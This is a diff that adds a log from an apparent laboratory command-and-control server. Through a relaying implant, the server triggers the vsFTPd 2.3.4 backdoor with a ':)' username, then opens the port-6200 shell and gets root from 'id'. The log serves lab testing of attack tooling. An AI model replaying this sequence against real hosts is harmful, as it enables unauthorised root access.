@@ -1,0 +1,31 @@
+21:50:14 [C2] Listening on 127.0.0.1:19443 (Ctrl+C to stop)
+21:50:14 [C2] Target configured as 127.0.0.1 FTP=2121 shell=6200
+21:50:15 [C2] 127.0.0.1:61365 connected
+21:50:15 [C2] 127.0.0.1:61365 RSA/RC4 handshake complete
+21:50:15 [C2] Victim -> C2 HELO
+  HELO
+    VER: 02 00 00 00
+    UUID: cf 4e 87 11 ae 74 e3 26 64 86 be c4 0a 58 13 80
+    PORT: 75 30 ('u0')
+    GROUP: 01 00
+    LDGROUP: e8 03
+    LID: 02 00 00 00 00 00 00 00
+    CT: 01 00 00 00
+21:50:15 [C2] C2 -> Victim SET LID=3 signed with laboratory RSAGlobal
+21:50:15 [C2] C2 -> Victim PING
+21:50:15 [C2] Victim -> C2 PONG
+21:50:15 [C2] C2 -> Victim CONN CH=1 127.0.0.1:2121
+21:50:15 [C2] Victim -> C2 CONN acknowledgement for CH=1
+21:50:15 [C2] Victim -> C2 FTP banner: b'220 (vsFTPd 2.3.4)\r\n'
+21:50:15 [C2] C2 -> Victim SEND CH=1 DT=b'USER lab:)\r\n' [55 53 45 52 20 6c 61 62 3a 29 0d 0a]
+21:50:15 [C2] Victim -> C2 RECV CH=1 DT=b'331 Please specify the password.\r\n'
+21:50:15 [C2] C2 -> Victim SEND CH=1 DT=b'PASS lab\r\n' [50 41 53 53 20 6c 61 62 0d 0a]
+21:50:15 [C2] C2 -> Victim CONN CH=2 127.0.0.1:6200 (attempt 1)
+21:50:15 [C2] Victim -> C2 CONN acknowledgement for CH=2
+21:50:15 [C2] C2 -> Victim SEND CH=2 DT=b'id\n' [69 64 0a]
+21:50:15 [C2] Victim -> C2 exploitation proof: b'uid=0(root) gid=0(root) groups=0(root)\n'
+21:50:15 [C2] C2 -> Victim SHUT CH=2 with empty DT
+21:50:15 [C2] Victim -> C2 DISC CH=2
+21:50:15 [C2] C2 -> Victim SHUT CH=1 with empty DT
+21:50:15 [C2] Victim -> C2 DISC CH=1
+21:50:15 [C2] LAB FLOW COMPLETED SUCCESSFULLY
